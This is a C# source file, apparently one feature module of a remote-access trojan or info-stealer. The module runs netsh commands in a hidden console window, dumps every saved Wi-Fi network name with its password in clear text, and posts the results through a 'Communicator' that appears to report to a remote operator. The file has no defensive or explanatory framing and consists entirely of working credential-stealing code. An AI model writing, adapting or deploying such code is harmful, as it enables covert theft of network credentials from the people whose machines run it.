using System;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    internal static class WifiPasswordExtractor
    {
        public static async Task RunAsync()
        {
            try
            {
                string profilesOutput = Execute("netsh wlan show profiles");
                var ssids = Regex.Matches(profilesOutput, @"All User Profile\s*:\s*(.+)")
                                 .Select(m => m.Groups[1].Value.Trim());

                StringBuilder result = new();
                foreach (string ssid in ssids)
                {
                    string profileOutput = Execute($"netsh wlan show profile name=\"{ssid}\" key=clear");
                    var passwordMatch = Regex.Match(profileOutput, @"Key Content\s*:\s*(.+)");
                    string password = passwordMatch.Success ? passwordMatch.Groups[1].Value : "(no password)";
                    result.AppendLine($"{ssid} → {password}");
                }

                await Communicator.PostResponse("wifi_passwords", result.ToString().Trim());
            }
            catch (Exception ex)
            {
                Logger.Error("WifiExtractor", ex.Message);
            }
        }

        private static string Execute(string command)
        {
            ProcessStartInfo psi = new("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            return proc?.StandardOutput.ReadToEnd() ?? "";
        }
    }
}
